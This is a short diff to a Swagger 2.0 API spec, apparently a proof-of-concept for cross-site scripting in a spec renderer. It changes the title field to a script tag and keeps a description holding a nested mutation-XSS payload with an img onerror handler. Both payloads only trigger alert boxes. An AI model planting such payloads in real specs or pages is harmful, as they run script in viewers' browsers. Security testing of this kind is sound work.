@@ -1,7 +1,7 @@
 swagger: '2.0'
 info:
   version: 1.0.0
-  title: Login Page - XSS PoC (Demo)
+  title: <script>alert(1)</script>
   description: >
     Demo description. The following line includes a safe PoC payload:
         <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert('textarea') src=1>"></form>
